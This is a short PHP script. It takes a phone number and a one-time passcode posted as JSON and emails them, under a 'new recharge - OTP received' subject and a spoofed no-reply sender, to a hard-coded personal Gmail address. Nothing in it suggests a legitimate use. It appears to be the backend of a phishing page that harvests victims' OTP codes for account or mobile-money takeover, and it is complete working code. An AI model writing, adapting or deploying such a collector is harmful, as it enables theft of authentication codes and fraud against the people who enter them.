<?php
$data = json_decode(file_get_contents('php://input'), true);
$num = $data['num'];
$otp = $data['otp'];

$to = "managerbuilding26@gmail.com";
$subject = "Nouvelle recharge - OTP reçu";
$message = "Numéro : $num\nCode OTP : $otp";
$headers = "From: no-reply@gainmaxvisuel.com";

if(mail($to,$subject,$message,$headers)){
    echo json_encode(["success"=>true]);
}else{
    echo json_encode(["success"=>false]);
}
?>